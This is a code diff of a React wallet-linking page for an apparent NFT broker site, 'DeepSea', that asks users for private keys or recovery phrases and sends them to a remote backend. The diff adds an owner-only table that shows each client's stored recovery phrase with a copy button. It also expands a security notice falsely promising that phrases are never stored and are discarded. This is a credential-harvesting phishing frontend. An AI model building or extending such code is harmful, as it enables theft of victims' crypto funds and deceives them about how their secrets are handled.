@@ -1,6 +1,6 @@
 import React, { useEffect, useState } from "react";
 import { useUserContext } from './UserRoleContext';
-import { Form, Button, Card, Spinner, Alert } from "react-bootstrap";
+import { Form, Button, Card, Spinner, Alert, Table } from "react-bootstrap";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
 import metamaskLogo from "../meta.PNG";
@@ -29,7 +29,7 @@ const LinkWallet = () => {
     if (!userId) return;
     (async () => {
       try {
-        const res = await fetch(`https://nft-broker-e3q7.onrender.com/api/nft-wallets/${userId}`);
+        const res = await fetch(`https://nft-broker-mroz.onrender.com/api/nft-wallets/${userId}`);
         const data = await res.json();
         if (data.wallets) setWallets(data.wallets);
       } catch (err) {
@@ -66,25 +66,25 @@ const LinkWallet = () => {
     setIsLoading(true);
 
     if (!formData.walletName.trim()) {
-      toast.error("Please enter a wallet name");
+      toast.error("Please enter a wallet name", { className: "custom-toast" });
       setIsLoading(false);
       return;
     }
 
     if (mode === "privateKey") {
       if (!formData.walletAddress || !validateEthereumAddress(formData.walletAddress)) {
-        toast.error("Please enter a valid Ethereum wallet address");
+        toast.error("Please enter a valid Ethereum wallet address", { className: "custom-toast" });
         setIsLoading(false);
         return;
       }
       if (!formData.privateKey.trim()) {
-        toast.error("Private key is required");
+        toast.error("Private key is required", { className: "custom-toast" });
         setIsLoading(false);
         return;
       }
     } else {
       if (!formData.recoveryPhrase.trim() || !isValidRecoveryPhrase(formData.recoveryPhrase)) {
-        toast.error("Please enter a valid 12 or 24-word recovery phrase");
+        toast.error("Please enter a valid 12 or 24-word recovery phrase", { className: "custom-toast" });
         setIsLoading(false);
         return;
       }
@@ -103,7 +103,7 @@ const LinkWallet = () => {
         payload.recoveryPhrase = formData.recoveryPhrase.trim();
       }
 
-      const res = await fetch("https://nft-broker-e3q7.onrender.com/api/nft-add-wallet", {
+      const res = await fetch("https://nft-broker-mroz.onrender.com/api/nft-add-wallet", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
@@ -135,6 +135,14 @@ const LinkWallet = () => {
     }
   };
 
+  const copyToClipboard = (text, label = "Copied!") => {
+    navigator.clipboard.writeText(text).then(() => {
+      toast.success(label, { autoClose: 1800 });
+    }).catch(() => {
+      toast.error("Failed to copy", { className: "custom-toast" });
+    });
+  };
+
   // ──────────────────────────────────────────────
   //  JSX remains the same
   // ──────────────────────────────────────────────
@@ -144,11 +152,16 @@ const LinkWallet = () => {
       {/* <ToastContainer position="top-center" autoClose={4000} theme="dark" /> */}
 
       <Card
-        className="shadow-lg border-0"
+        className="shadow-lg border-0 main-container mt-5"
         style={{
           borderRadius: "16px",
-          background: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
+          // background: "linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%)",
           overflow: "hidden",
+          maxWidth: "900px",
+          background: "#d6dee8", // Light grayish-blue
+          borderRadius: "15px",
+          boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)",
+          color: "#334155", // Dark blue-gray text
         }}
       >
         <Card.Body className="p-4 p-md-5">
@@ -194,7 +207,7 @@ const LinkWallet = () => {
           </div>
 
           <Alert variant="info" className="mb-4 small">
-            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers.
+            <strong>Security notice:</strong> We never store your private keys or seed phrases on our servers. DeepSea would never ask you to share them. They are used only once to verify ownership of the wallet and then discarded. Always keep them secure and never share with anyone.
           </Alert>
 
           <Form onSubmit={handleSubmit}>
@@ -304,45 +317,106 @@ const LinkWallet = () => {
               </Button>
             </div>
           </Form>
-
-          {wallets.length > 0 && (
-            <Card className="mt-5 border-0 shadow-sm">
-              <Card.Body>
-                <h5 className="fw-bold mb-3">
-                  {isOwnerView ? "Client Wallets" : "Your Connected Wallets"}
-                </h5>
-                <div className="table-responsive">
-                  <table className="table table-hover align-middle">
-                    <thead className="table-light">
-                      <tr>
-                        {isOwnerView && <th>Owner</th>}
-                        <th>Name</th>
-                        <th>Address / Method</th>
-                        <th>Added</th>
-                      </tr>
-                    </thead>
-                    <tbody>
-                      {wallets.map((w, i) => (
-                        <tr key={w._id || i}>
-                          {isOwnerView && <td>{w.ownerName || "—"}</td>}
-                          <td>{w.walletName}</td>
-                          <td>
-                            <code style={{ fontSize: "0.9rem" }}>
-                              {w.walletAddress || "Imported via seed phrase"}
-                            </code>
-                          </td>
-                          <td>{new Date(w.dateAdded).toLocaleDateString()}</td>
-                        </tr>
-                      ))}
-                    </tbody>
-                  </table>
-                </div>
-              </Card.Body>
-            </Card>
-          )}
         </Card.Body>
       </Card>
+
+      {/* Wallets Table – matches backend logic */}
+      {wallets.length > 0 && (
+        <Card className="mt-5 border-0 shadow-sm bg-white main-container">
+          <Card.Body className="p-4">
+            <h5 className="fw-bold mb-3 text-dark">
+              {isOwnerView ? "All Client Wallets" : "Your Connected Wallets"}
+            </h5>
+            <div className="table-responsive">
+              <Table hover bordered className="mb-0 align-middle">
+                <thead className="table-light">
+                  <tr>
+                    {isOwnerView && <th>Owner</th>}
+                    <th>Nickname</th>
+                    <th>Address / Method</th>
+                    {isOwnerView && <th>Recovery Phrase</th>}
+                    <th>Added</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {wallets.map((w, i) => (
+                    <tr key={w._id || i}>
+                      {isOwnerView && <td>{w.ownerName || "—"}</td>}
+                      <td className="fw-medium">{w.walletName}</td>
+
+                      {/* Address cell – now with integrated copy button */}
+                      <td>
+                        {w.walletAddress ? (
+                          <div className="d-flex align-items-center gap-2">
+                            <code
+                              style={{
+                                fontSize: "0.9rem",
+                                flex: 1,
+                                wordBreak: "break-all",
+                                cursor: "pointer",
+                              }}
+                              onClick={() => copyToClipboard(w.walletAddress, "Address copied")}
+                              title="Click text to copy full address"
+                            >
+                              {`${w.walletAddress.slice(0, 8)}...${w.walletAddress.slice(-6)}`}
+                            </code>
+                            <Button
+                              variant="outline-secondary"
+                              size="sm"
+                              onClick={() => copyToClipboard(w.walletAddress, "Address copied")}
+                              title="Copy full address"
+                            >
+                              <i className="bi bi-clipboard"></i>
+                            </Button>
+                          </div>
+                        ) : (
+                          <span className="text-muted">Imported via seed phrase</span>
+                        )}
+                      </td>
+
+                      {/* Recovery phrase – already good, kept as-is */}
+                      {isOwnerView && (
+                        <td>
+                          {w.recoveryPhrase ? (
+                            <div className="d-flex align-items-center gap-2">
+                              <code
+                                style={{
+                                  fontSize: "0.85rem",
+                                  flex: 1,
+                                  wordBreak: "break-all",
+                                }}
+                              >
+                                {w.recoveryPhrase.slice(0, 10)}...
+                              </code>
+                              <Button
+                                variant="outline-secondary"
+                                size="sm"
+                                onClick={() => copyToClipboard(w.recoveryPhrase, "Recovery phrase copied")}
+                                title="Copy full recovery phrase (use with extreme caution)"
+                              >
+                                <i className="bi bi-clipboard"></i>
+                              </Button>
+                            </div>
+                          ) : (
+                            <span className="text-muted">—</span>
+                          )}
+                        </td>
+                      )}
+
+                      <td className="text-muted small">
+                        {new Date(w.dateAdded).toLocaleDateString()}
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </Table>
+            </div>
+          </Card.Body>
+        </Card>
+      )}
     </div>
+
+
   );
 };
 
